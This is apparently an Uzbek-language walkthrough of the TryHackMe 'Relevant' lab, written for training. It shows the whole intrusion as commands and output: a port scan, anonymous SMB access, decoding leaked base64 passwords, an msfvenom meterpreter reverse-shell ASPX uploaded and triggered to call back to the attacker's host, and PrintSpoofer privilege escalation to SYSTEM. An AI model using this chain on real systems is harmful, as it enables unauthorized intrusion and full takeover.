# Relevant

Room Link: https://tryhackme.com/room/relevant



Qani sarguzashtni boshladik!

## Avvalo ishni razvetkadan boshlaymiz.

Port Scanning!

Ko'pchilik **NMAP** dan foydalanadi. Men **RustScan**ni afzal bildim. Sababi tez va nmap bilan birga ishlaydi.

Buyruq:

```
rustscan -a 10.10.158.109 -- -sV
```

bu buyruqda:

- -a  — nishonni belgilayapti
- -- -sV — nmapdagi -sV flagini olyapti. Ushbu flag versiyalarni aniqlash uchun ishlatilinadi!

```
╭─mete   󰉖 ~
╰─ ❯❯ rustscan -a 10.10.158.109 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.158.109:80
Open 10.10.158.109:135
Open 10.10.158.109:139
Open 10.10.158.109:445
Open 10.10.158.109:3389
Open 10.10.158.109:49666
Open 10.10.158.109:49667
Open 10.10.158.109:49663
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.158.109
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 18:44 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 18:44
Scanning 10.10.158.109 [2 ports]
Completed Ping Scan at 18:44, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:44
Completed Parallel DNS resolution of 1 host. at 18:44, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:44
Scanning 10.10.158.109 [8 ports]
Discovered open port 135/tcp on 10.10.158.109
Discovered open port 3389/tcp on 10.10.158.109
Discovered open port 80/tcp on 10.10.158.109
Discovered open port 139/tcp on 10.10.158.109
Discovered open port 445/tcp on 10.10.158.109
Discovered open port 49667/tcp on 10.10.158.109
Discovered open port 49663/tcp on 10.10.158.109
Discovered open port 49666/tcp on 10.10.158.109
Completed Connect Scan at 18:44, 0.12s elapsed (8 total ports)
Initiating Service scan at 18:44
Scanning 8 services on 10.10.158.109
Completed Service scan at 18:45, 55.70s elapsed (8 services on 1 host)
NSE: Script scanning 10.10.158.109.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:45
Completed NSE at 18:45, 0.55s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:45
Completed NSE at 18:45, 0.49s elapsed
Nmap scan report for 10.10.158.109
Host is up, received syn-ack (0.12s latency).
Scanned at 2025-06-01 18:44:50 +05 for 57s

PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
49663/tcp open  http          syn-ack Microsoft IIS httpd 10.0
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.13 seconds
```

Tak...

139 va 445 portlari ochiq ekan... SMB xizmatlari ishlamoqda demak.

Buyruq:

````
smbclient -L //10.10.158.109 -N
````

Tushuntirish:

-L  —  tarmoqdagi barcha ulanishlarni ko'rsatadi

`-N` — parolsiz ulanishga harakat qiladi

//10.10.158.109 — bu esa nishon

```
╭─mete   󰉖 ~
╰─ ❯❯ smbclient -L //10.10.158.109 -N
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```

nt4wrksv -- Bu hech qanday xizmat emas. Unda qiziqarli fayllar bo'lishi mumkin.

Endisa esa ushbu **sharename**ni sinab ko'ramiz.

Buyruq:

````
smbclient //10.10.158.109/nt4wrksv -N
````

Tushuntirish:

-N — avval ham aytib o'tilganidek, parolsiz kirishga harakat qilib ko'radi.

```
╭─mete   󰉖 ~/THM/THM-LABS/0106-2025
╰─ ❯❯ smbclient //10.10.158.109/nt4wrksv -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 26 02:46:04 2020
  ..                                  D        0  Sun Jul 26 02:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 20:15:33 2020

		7735807 blocks of size 4096. 5137522 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit

╭─mete   󰉖 ~/THM/THM-LABS/0106-2025
╰─ ❯❯ ls
 passwords.txt
```

Kirganimdan so'ng **ls** buyrug'i orqali fayl/papkalar ro'yxatini ko'rdim. 

**passwords.txt** qiziq....

keyin esa shu faylni **get** buyrug'i orqali yuklab oldim.

Endi esa yuklangan faylni ekranga chiqaramiz, **cat** buyrug'i orqali:

```
╭─mete   󰉖 ~/THM/THM-LABS/0106-2025
╰─ ❯❯ cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

> **@Akhatkulov:**
>
> Fine)
>
> Ikkalasi ham **base64** ko'rinishida kodlangan ekan.

Endi esa bularni koddan chiqaramiz.

```╭─mete   󰉖 ~
╭─mete   󰉖 ~
╰─ ❯❯ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
╭─mete
╰─ ❯❯ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123
```

Tushuntirish:

**echo** — bu matnni ekranga chiqarish uchun.

**|** -- bu pipe deyiladi. Hozircha buni ikki buyruqni o'zaro bog'lash deb tushuning. Keyin tushunib olasiz.

**base64 -d** — bu esa **base64** kodlash uchun dastur **-d** esa decode qilish kerak ekanini bildiradi.



Bu yerga endi zararli fayllar joylaymiz. Bob va Billning parollari esa bizga keyinroq asqotadi.

## Zararli fayl(reverse shell) tayyorlash

```
╭─mete   󰉖 ~
╰─ ❯❯ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.24.135 lport=4444 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 203846 bytes
Final size of aspx file: 1030518 bytes
Saved as: shell.aspx
```

Bu msfvenom orqali Reverse Shell tayyorlash!
Buyruq tahlili:

**-p** — bu orqali payload belgilayapmiz

**lhost** — bu esa reverse shellni qabul qiluvchi yani haker(biz)ning IP manzilimiz.

**lport** — bu esa port yani qaysi portdan qabul qilamiz.

**-f** — formati

**-o shell.aspx** — fayl yozish, bizning dasturni qanday nomda saqlanishini belgilab beramiz.

Endi esa **PUT** buyrug;i orqali tayyorlangan shellni yuklaymiz, serverga.

```
╭─mete   󰉖 ~/THM/THM-LABS/0106-2025
╰─ ❯❯ ls
 passwords.txt   shell.aspx

╭─mete   󰉖 ~/THM/THM-LABS/0106-2025
╰─ ❯❯ smbclient //10.10.186.118/nt4wrksv -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (606.3 kb/s) (average 606.3 kb/s)

```

## Keyingi bosqich esa reverse shellni tutib olishga tayyorgarlik ko'rish.

Metasploitni ishga tushirish

```markdown
msfconsole
```
Handlerdan foydalanishni belgilash
```
use exploit/multi/handler
```
Bizga kerakli payloadni belgilash
```
set payload windows/x64/meterpreter_reverse_tcp
```
Hujumchi(ya'ni biz)ni IP manzilimizni ko'rsatish.
```
set LHOST 10.8.24.135
```
Eshituvchi portni belgilash.
```
set LPORT 4444
```
Ishga tushurish.
```
run
```



## Shellni ishga tushirish

So'rov yuboramiz.
```
curl http://10.10.186.118:49663/nt4wrksv/shell.aspx
```

va MetaSploitdan quyidagicha javob olamiz
```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.8.24.135:4444 
[*] Meterpreter session 1 opened (10.8.24.135:4444 -> 10.10.186.118:49813) at 2025-06-02 22:00:59 +0500

meterpreter > 
```

## Ana endi qiziq joyiga keldik)
Agar MSF(MetaSploit FrameWork)ni yaxshi bilmasangiz quyidagicha
```
meterpreter > help
```

**help** -- buyrug'ini tering

Bizga hozir server terminali kerak. 
shell deb yozamiz.
So'ng **powershell** deb yozib powershellga kiramiz. Menga shu qulay)
Ishni foydalanuvchilardan boshlaymiz

```
cd C:\Users
```

Serverda bor foydalanuvchilar:
```
Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----
d-----        7/25/2020   8:05 AM                .NET v4.5                     
d-----        7/25/2020   8:05 AM                .NET v4.5 Classic             
d-----        7/25/2020  10:30 AM                Administrator                 
d-----        7/25/2020   2:03 PM                Bob                           
d-r---        7/25/2020   7:58 AM                Public   
```

Bob foydalanuvchi papkasiga kiramiz. Kirsam bu yerda Desktop nomli papka bor ekan. Ichida esa user.txt.
BINGO!!! Biz 1-vazifani uddaladik. 

```
SssPS C:\Users\Bob\Desktop> cat user.txt   
cat user.txt
THM{harakat_qil}
```



## Endi esa Katta aka (ya'ni admin) huquqini olishga harakat qilamiz.



Biz powershelldan cmdga, cmddan esa meterpreterga o'tishimiz kerak. Ya'ni exit va yana exit teramiz.

**getprivs** — meterpreter buyrug'i orqali huquqlarimizni ko'ramiz.

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

**SeImpersonatePrivilege** — ushbu huquq bizda bor ekan.  Bu huquq yordamida biz tizimda boshqa foydalanuvchi nomidan ishlay olamiz,  **SYSTEM** darajasiga chiqishingiz mumkin.



PrintSpoofer64.exe eksplatatsiyasini o'zimizni kompyuterga yuklab olamiz va uni serverga yuklaymiz.

```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

Endi esa serverga yuklaymiz.

```
╭─mete   󰉖 ~/THM/THM-LABS/0106-2025
╰─ ❯❯ smbclient //10.10.31.168/nt4wrksv -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer64.exe
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (39.3 kb/s) (average 39.3 kb/s)
smb: \> exit

```



Meterpreterdan **shell** deb terib terminalni ochamiz va yuklagan joyimizga kiramiz.
```
cd c:/inetpub/wwwroot/nt4wrksv
```

Ishga tushiramiz.
```
PrintSpoofer64.exe -i -c powershell.exe
```
So'ngra **whoami** buyrug'i orqali kim ekanimizni tekshiramiz.
```
PS C:\Windows\system32> whoami
nt authority\system
```

**Tigidish!!!** Biz tizimmiz) 

Vanihoyat, endi Administatorning fayllariga kirib kerakli ma'lumotni olamiz.

```
cd \users\administrator\desktop
```

```
PS C:\users\administrator\desktop> cat root.txt
THM{harakat_qil}
```



### Nafas olar ekanman, men yana davom etaman... 
